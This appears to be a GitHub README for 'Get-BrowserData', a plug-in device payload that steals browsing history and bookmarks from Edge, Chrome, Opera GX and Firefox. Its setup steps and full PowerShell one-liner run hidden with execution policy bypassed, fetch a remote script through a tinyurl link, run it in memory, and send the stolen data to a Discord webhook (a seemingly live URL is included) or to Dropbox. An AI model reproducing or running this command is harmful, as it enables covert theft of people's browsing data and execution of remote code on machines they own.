
<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Get-BrowserData

<p align="center">
      <a href="https://youtu.be/2qkgQAwDZgk">
        <img src=https://i.ytimg.com/vi/2qkgQAwDZgk/maxresdefault.jpg width="300" alt="Python" />
      </a>
      <br>YouTube Tutorial	
</p>

## Description

This payload can be used to retrieve the browsing history and bookmarks from Edge, Chrome, Opera GX, and Firefox (no bookmarks from firefox currently).

They are then exfiled using either Discord or Dropbox.

## The Function

### [Get-BrowserData] 

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* You no longer need to host your own version of this script
* $db is the variable that holds your DropBox token
* $dc is the variable that holds your Discord webhook
* Fill in either variable or both to set your exfil method

SYNTAX:

```
powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1092997498089521183/ZzWeOZRzAfNWtqXfzLDv47DMWokwf-yMbhL-px977t0sqqTGDuT9YmI27cIKRrxF9Tza';irm tinyurl.com/browserData1 | iex
```
